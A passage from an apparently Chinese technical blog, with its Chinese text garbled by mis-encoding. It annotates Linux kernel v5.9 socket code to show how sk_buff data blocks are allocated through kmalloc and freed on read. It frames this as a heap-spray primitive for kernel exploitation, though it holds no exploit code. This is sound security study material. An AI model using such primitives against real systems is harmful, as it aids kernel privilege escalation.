class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">other</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> err, size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> fds_sent = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> data_len;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">	<span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">		size = len - sent;</span><br><span class="line">		<span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line">		<span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line">		data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line">		data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line">        <span class="comment">//------------------åˆ†å‰ä¸€:å†…å­˜ç”³è¯·éƒ¨åˆ†</span></span><br><span class="line">		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">					   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">					   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        <span class="comment">//ç›¸å…³æ£€æŸ¥éƒ¨åˆ†</span></span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		<span class="comment">/* Only send the fds in the first buffer */</span></span><br><span class="line">		err = unix_scm_to_skb(&amp;scm, skb, !fds_sent);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//.....</span></span><br><span class="line">        <span class="comment">//----------------------åˆ†å‰äºŒ:æ•°æ®å¤åˆ¶éƒ¨åˆ†</span></span><br><span class="line">		skb_put(skb, size - data_len);</span><br><span class="line">		skb-&gt;data_len = data_len;</span><br><span class="line">		skb-&gt;len = size;</span><br><span class="line">        <span class="comment">//è¿™é‡Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶</span></span><br><span class="line">		err = skb_copy_datagram_from_iter(skb, <span class="number">0</span>, &amp;msg-&gt;msg_iter, size);</span><br><span class="line">		<span class="keyword">if</span> (err) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">		sent += size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sent;</span><br><span class="line">out_err:</span><br><span class="line">	scm_destroy(&amp;scm);</span><br><span class="line">	<span class="keyword">return</span> sent ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-å†…å­˜ç”³è¯·-1"   >
          <a href="#A-å†…å­˜ç”³è¯·-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·-1" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <p>å…ˆè¿›è¡Œç›¸å…³å†…å­˜ç”³è¯·ï¼Œå³<code>sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</code></p>
<p>è¿˜æ˜¯æŒºé•¿çš„ï¼Œä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯æœ€åçš„<code>__alloc_skb</code>å‡½æ•°ï¼Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">    <span class="comment">//ä»ä¸“é—¨çš„ç¼“å­˜æ± skbuff_fclone_cache/skbuff_head_cacheä¸­ç”³è¯·å†…å­˜</span></span><br><span class="line">    <span class="comment">//ä½œä¸ºå¤´éƒ¨çš„ç®¡ç†ç»“æ„</span></span><br><span class="line">	skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (!skb)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    <span class="comment">//å…ˆå¯¹é½ï¼Œè¿™ä¸ªå’ŒL1_CACHE_BYTESæœ‰å…³,64ä½ç³»ç»Ÿå³å’Œ64(0x40)å¯¹é½,32ä½ç±»ä¼¼ï¼Œå…·ä½“çš„è¿˜æ˜¯æŸ¥ä¸€ä¸‹æœ€å¥½</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">    <span class="comment">//size += å¯¹é½ä¹‹åçš„0x140</span></span><br><span class="line">    <span class="comment">//é‚£ä¹ˆsizeåªå¯èƒ½æ˜¯0x140+n*0x40,æœ€ä½ä¸º0x180,å±äºkmalloc-512</span></span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è™½ç„¶æ˜¯kmalloc_reserveå‡½æ•°ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯kmallocå½¢å¼</span></span><br><span class="line">    <span class="comment">//è°ƒç”¨åˆ°`__kmalloc_node_track_caller`å‡½æ•°è¿›è¡Œåˆ†é…</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªdataå³ä¸ºæˆ‘ä»¬å®é™…çš„å­˜å‚¨æ•°æ®çš„åœ°æ–¹,ä¹Ÿæ˜¯ä»kmallocç”³è¯·å‡ºçš„å †å—</span></span><br><span class="line">    <span class="comment">//å¹¶ä¸”æ˜¯ä»å¯¹å¼€çš„å¼€å¤´ä½ç½®å¤„å¼€å§‹å­˜å‚¨,å®Œæˆå†…å­˜ç”³è¯·åè¿”å›unix_stream_sendmsgå‡½æ•°</span></span><br><span class="line">    <span class="comment">//åœ¨`skb_copy_datagram_from_iter`å‡½æ•°ä¸­æ•°æ®ä¼šè¢«å¤åˆ¶</span></span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">goto</span> nodata;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–å¤´éƒ¨çš„ç®¡ç†ç»“æ„</span></span><br><span class="line">	<span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line">	<span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">	skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">	skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">	refcount_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">	skb-&gt;head = data;</span><br><span class="line">	skb-&gt;data = data;</span><br><span class="line">	skb_reset_tail_pointer(skb);</span><br><span class="line">	skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">	skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">	skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> skb;</span><br><span class="line">nodata:</span><br><span class="line">	kmem_cache_free(cache, skb);</span><br><span class="line">	skb = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li><code>sk_buff</code>ä¸ºæ•°æ®çš„ç®¡ç†ç»“æ„ä»ä¸“é—¨çš„ç¼“å­˜æ± <code>skbuff_fclone_cache/skbuff_head_cache</code>ä¸­ç”³è¯·å†…å­˜ï¼Œæ²¡åŠæ³•è¿›è¡Œæ§åˆ¶</li>
<li><code>skb-&gt;data</code>ä¸ºå®é™…çš„æ•°æ®ç»“æ„<ul>
<li><code>size</code>ï¼š<code>0x140+n*0x40</code>(0x40çš„å€æ•°è¡¥é½)ã€‚å³å¦‚æœä¼ å…¥çš„æ•°æ®é•¿åº¦ä¸º0x3fï¼Œåˆ™nä¸º1ï¼Œä¼ å…¥æ•°æ®ä¸º0x41ï¼Œåˆ™nä¸º2ã€‚</li>
<li>å †å—ç”³è¯·ï¼šèµ°<code>kmalloc</code>è¿›è¡Œç”³è¯·ï¼Œæ¯”è¾ƒå¸¸è§çš„ç§ç±»ï¼Œæ–¹ä¾¿å †å–·ã€‚</li>
</ul>
</li>
<li>æ¯è°ƒç”¨<code>wirte</code>å‡½æ•°å†™å…¥ä¸€æ¬¡æ•°æ®ï¼Œéƒ½ä¼šèµ°ä¸€éæµç¨‹ï¼Œç”³è¯·æ–°çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>ï¼Œä¸åŒæ¶ˆæ¯ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶-1"   >
          <a href="#B-æ•°æ®å¤åˆ¶-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶-1" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>ç›¸å…³å†…å­˜ç”³è¯·å®Œæˆä¹‹åï¼Œå›åˆ°<code>unix_stream_sendmsg</code>å‡½æ•°ï¼Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶<code>skb_copy_datagram_from_iter</code>ï¼Œå³ä¸Šè¿°æåˆ°çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">skb_copy_datagram_from_iter</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">                                struct iov_iter *from,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = skb_headlen(skb);			<span class="comment">// skb-&gt;len - skb-&gt;data_len;</span></span><br><span class="line">    <span class="keyword">int</span> i, copy = start - offset;			<span class="comment">// copy æ˜¯çº¿æ€§æ•°æ®åŒºçš„å‰©ä½™ç©ºé—´å¤§å°</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line">    <span class="comment">//æ‹·è´åˆ°ç”³è¯·çš„ä¿å­˜æ•°æ®çš„å †å—skb-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">            copy = len;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_iter(skb-&gt;data + offset, copy, from) != copy)</span><br><span class="line">            <span class="keyword">goto</span> fault;</span><br><span class="line">        <span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        offset += copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-4"   >
          <a href="#â‘¡é‡Šæ”¾-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-4" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>å½“ä»<code>socker</code>å¥—æ¥å­—ä¸­è¯»å–å‡ºæŸæ¡ä¿¡æ¯çš„æ‰€æœ‰æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¯¥æ¡ä¿¡æ¯çš„ç›¸å…³å†…å­˜çš„é‡Šæ”¾ï¼Œå³è¯¥æ¡ä¿¡æ¯å¯¹åº”<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>çš„é‡Šæ”¾ã€‚åŒæ ·çš„ï¼Œå¦‚æœè¯¥æ¡ä¿¡æ¯æ²¡æœ‰è¢«è¯»å–å®Œæ¯•ï¼Œåˆ™ä¸ä¼šå‘ç”Ÿè¯¥ä¿¡æ¯ç›¸å…³å†…å­˜çš„é‡Šæ”¾ã€‚</p>
<p>åœ¨<code>read</code>æ—¶è¿›è¡Œçš„å‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; ksys_read() -&gt; vfs_read() -&gt; new_sync_read() -&gt; call_read_iter() -&gt; sock_read_iter() -&gt; sock_recvmsg() -&gt; sock_recvmsg_nosec() -&gt; unix_stream_recvmsg() -&gt; unix_stream_read_generic()</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·çš„åœ¨<code>unix_stream_read_generic</code>å¤„å¼€å§‹åˆ†å‰ï¼Œä¹Ÿæ˜¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸‹é¢æˆªå–é‡è¦éƒ¨åˆ†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">bool</span> freezable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		chunk = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, unix_skb_len(skb) - skip, size);</span><br><span class="line">		skb_get(skb);</span><br><span class="line">        <span class="comment">//------------------åˆ†å‰ä¸€:æ•°æ®å¤åˆ¶</span></span><br><span class="line">        <span class="comment">//recv_actorå‡½æ•°æŒ‡é’ˆæ˜¯åœ¨unix_stream_recvmsgå‡½æ•°ä¸­å®šä¹‰çš„stateå‡½æ•°è¡¨</span></span><br><span class="line">        <span class="comment">//è¯¥å‡½æ•°æŒ‡é’ˆå¯¹åº”unix_stream_read_actorå‡½æ•°,å³ä»è¿™å¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶</span></span><br><span class="line">		chunk = state-&gt;recv_actor(skb, skip, chunk, state);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="comment">//ä¼ è¾“æ•°æ®å®Œæˆä¹‹å,skb-&gt;usersä»2æ”¹ä¸º1,è¡¨ç¤ºå·²ç»å¤åˆ¶å®Œæ•°æ®äº†,æ–¹ä¾¿åç»­åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">//æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜æœ‰æ•°æ®</span></span><br><span class="line">		consume_skb(skb);</span><br><span class="line">		<span class="keyword">if</span> (chunk &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (copied == <span class="number">0</span>)</span><br><span class="line">				copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		copied += chunk;</span><br><span class="line">		size -= chunk;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Mark read part of skb as used */</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; MSG_PEEK)) &#123;</span><br><span class="line">            <span class="comment">//ä¿®æ”¹skbç±»å‹è½¬æ¢ä¹‹åå¯¹åº”çš„consumedå­—æ®µ,å…¶å®å°±æ˜¯skb-&gt;cbæŸä¸ªä½ç½®å¤„çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//#define UNIXCB(skb)	(*(struct unix_skb_parms *)&amp;((skb)-&gt;cb))</span></span><br><span class="line">			UNIXCB(skb).consumed += chunk;</span><br><span class="line">			<span class="comment">//ä¾æ®ä¸Šé¢çš„consumedå’Œlenæ¥åˆ¤æ–­æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜å‰©ä¸‹æ²¡æœ‰ä¼ è¾“çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//æœ‰(1)åˆ™break,æ— (0)åˆ™è¿›å…¥åç»­çš„å†…å­˜é‡Šæ”¾é˜¶æ®µ</span></span><br><span class="line">			<span class="keyword">if</span> (unix_skb_len(skb))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//------------------------åˆ†å‰äºŒ:å†…å­˜é‡Šæ”¾</span></span><br><span class="line">            <span class="comment">//å†…å­˜é‡Šæ”¾å‰ç½®å·¥ä½œ</span></span><br><span class="line">			skb_unlink(skb, &amp;sk-&gt;sk_receive_queue);</span><br><span class="line">            <span class="comment">//è¿›å…¥è¯¥å‡½æ•°,é€šè¿‡å¯¹äºskb-&gt;usersçš„åˆ¤æ–­ä¹‹å,è¿›å…¥å†…å­˜é‡Šæ”¾é˜¶æ®µ</span></span><br><span class="line">			consume_skb(skb);</span><br><span class="line">            <span class="comment">//....................</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (size);</span><br><span class="line">        <span class="comment">//......................</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> copied ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-æ•°æ®å¤åˆ¶"   >
          <a href="#A-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-æ•°æ®å¤åˆ¶" class="headerlink" title="A.æ•°æ®å¤åˆ¶"></a>A.æ•°æ®å¤åˆ¶</h5>
      <p>ä¹‹åçš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_stream_read_actor() -&gt; skb_copy_datagram_msg() -&gt; skb_copy_datagram_iter() -&gt; __skb_datagram_iter()</span><br></pre></td></tr></table></div></figure>

<p>æœ€ç»ˆè¿›å…¥<code>__skb_datagram_iter</code>ï¼Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __skb_datagram_iter(<span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">int</span> offset,</span><br><span class="line">			       struct iov_iter *to, <span class="keyword">int</span> len, <span class="keyword">bool</span> fault_short,</span><br><span class="line">			       <span class="keyword">size_t</span> (*cb)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">void</span> *,</span><br><span class="line">					    struct iov_iter *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> start = skb_headlen(skb);</span><br><span class="line">	<span class="keyword">int</span> i, copy = start - offset, start_off = offset, n;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy header. */</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªheaderæŒ‡çš„å°±æ˜¯æ•°æ®data,å¤§æ¦‚å°±æ˜¯ä»è¿™é‡Œå¼€å§‹å®é™…çš„æ•°æ®</span></span><br><span class="line">	<span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line">		n = INDIRECT_CALL_1(cb, simple_copy_to_iter,</span><br><span class="line">				    skb-&gt;data + offset, copy, data, to);</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (n != copy)</span><br><span class="line">			<span class="keyword">goto</span> short_copy;</span><br><span class="line">		<span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">/* Copy paged appendix. Hmm... why does this look so complicated? */</span></span><br><span class="line">    <span class="comment">//linuxå†…æ ¸ç»´æŠ¤äººå‘˜éƒ½çœ‹ä¸ä¸‹å»äº†,xs</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œä½¿ç”¨äº†æ„Ÿè§‰å¾ˆå¤æ‚çš„æœºåˆ¶ï¼Œä¸æ˜¯å¾ˆæ‡‚ã€‚</p>

        <h5 id="B-å†…å­˜é‡Šæ”¾"   >
          <a href="#B-å†…å­˜é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-å†…å­˜é‡Šæ”¾" class="headerlink" title="B.å†…å­˜é‡Šæ”¾"></a>B.å†…å­˜é‡Šæ”¾</h5>
      <p>è¿›å…¥å†…å­˜é‡Šæ”¾çš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p>
<ul>
<li><p>é‡Šæ”¾<code>skb-&gt;data</code>éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;skb_release_all()-&gt;skb_release_all()-&gt;skb_release_data()-&gt;skb_free_head()</span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_free_head</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//å…¶å®headå’Œdataæ˜¯ä¸€æ ·çš„</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *head = skb-&gt;head;</span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

